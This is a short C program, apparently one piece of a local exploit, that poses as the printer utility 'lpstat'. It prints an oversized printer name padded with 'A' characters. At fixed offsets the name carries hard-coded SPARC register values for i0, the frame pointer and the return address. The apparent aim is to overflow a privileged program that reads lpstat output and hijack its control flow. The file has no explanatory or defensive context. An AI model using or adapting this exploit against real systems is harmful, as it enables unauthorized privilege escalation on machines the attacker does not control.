#include <stdio.h>
#define SIZE 290

void
usage()
{
 fprintf(stderr,"called with no arguments\n");
 exit(-1);
}

int 
main(int argc,char **argv) {
 
char name[SIZE];   /* printer name */ 

memset(name,0x00,sizeof(name)); /*clear with zeros*/
memset(name,0x41,SIZE);

/* i0  */
name[204]=0xfe;
name[205]=0xd2;
name[206]=0x27;
name[207]=0x64;

/* fp */
name[228]=0xfe;
name[229]=0x8d;
name[230]=0x9d;
name[231]=0x78;

/* i7  */
name[232]=0xff;
name[233]=0xbe; 
name[234]=0xec;
name[235]=0x50;

name[SIZE-1]=0x00;


if(argc<2) {
  usage();
}

if(!strcmp(argv[1],"-v"))
{
   fprintf(stderr,"lpstat called with -v\n");
   printf("device for %s: /dev/null\n",name);
}
else
{
   fprintf(stderr,"lpstat called with -d\n");
   printf("system default destination: %s\n",name);
}

}
